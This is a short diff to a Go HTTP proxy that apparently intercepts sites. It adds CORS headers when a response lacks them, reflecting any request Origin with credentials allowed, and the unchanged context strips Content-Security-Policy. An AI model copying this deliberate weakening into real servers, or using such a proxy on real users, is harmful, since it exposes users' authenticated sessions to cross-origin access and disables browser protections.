@@ -913,6 +913,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+			} else if allow_origin == "" {
+				// Add CORS headers if missing - needed for gstatic.com and other CDNs
+				origin := resp.Request.Header.Get("Origin")
+				if origin != "" {
+					resp.Header.Set("Access-Control-Allow-Origin", origin)
+					resp.Header.Set("Access-Control-Allow-Credentials", "true")
+					resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+					resp.Header.Set("Access-Control-Allow-Headers", "*")
+				} else {
+					resp.Header.Set("Access-Control-Allow-Origin", "*")
+					resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+					resp.Header.Set("Access-Control-Allow-Headers", "*")
+				}
 			}
 			var rm_headers = []string{
 				"Content-Security-Policy",
